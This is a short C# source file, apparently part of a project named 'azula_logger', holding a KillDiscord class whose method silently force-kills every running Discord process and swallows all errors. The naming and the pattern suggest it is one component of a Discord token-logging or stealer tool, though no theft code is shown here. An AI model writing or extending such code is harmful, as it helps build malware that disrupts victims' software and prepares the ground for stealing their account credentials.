using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace azula_logger
{
    class KillDiscord
    {
        public static void Kill()
        {
            try
            {
            Process[] discord = Process.GetProcesses();

            foreach (Process opendiscord in discord)
            {
                bool flag = opendiscord.ProcessName == "Discord";
                if (flag)
                {
                        opendiscord.Kill();
                }
            }
            }
            catch { }

        }
    }
}
